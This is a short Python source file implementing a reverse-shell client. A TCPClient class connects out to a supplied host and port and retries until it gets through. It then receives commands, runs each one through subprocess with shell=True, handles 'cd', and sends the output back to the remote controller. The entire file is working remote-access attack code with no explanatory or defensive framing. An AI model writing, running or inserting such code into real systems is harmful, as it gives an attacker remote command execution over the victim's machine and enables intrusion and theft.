import os
import socket
import subprocess
import sys
import time
import threading

class TCPClient(object):
    def __init__(self, bind_ip, bind_port, timeout=5):
        self.bind_ip = bind_ip
        self.bind_port = int(bind_port)
        self.timeout = timeout
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def start(self):
        self.server.connect((self.bind_ip, self.bind_port))

    def reverse_shell(self):
        while True:
                command = self.server.recv(1024)
                if len(command) == 0:
                    continue
                command = command.decode()
                if command in ['quit', 'exit']:
                    self.server.send('Disconnecting. \n'.encode())
                    self.server.close()
                    break
                if command[:2] == 'cd':
                    os.chdir(command[3:])
                if len(command) > 0:
                    cmd = subprocess.Popen(command[:], 
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE )
                    output = cmd.stdout.read().decode()
                    self.server.send(str.encode(output + '$ '))

    def run(self):
        while True:
            try:
                self.start()
            except Exception:
                time.sleep(self.timeout)
            else:
                print(f'[*] Connected to {self.bind_ip}:{self.bind_port}')
                break
        client_handler = threading.Thread(target=self.reverse_shell)
        client_handler.start()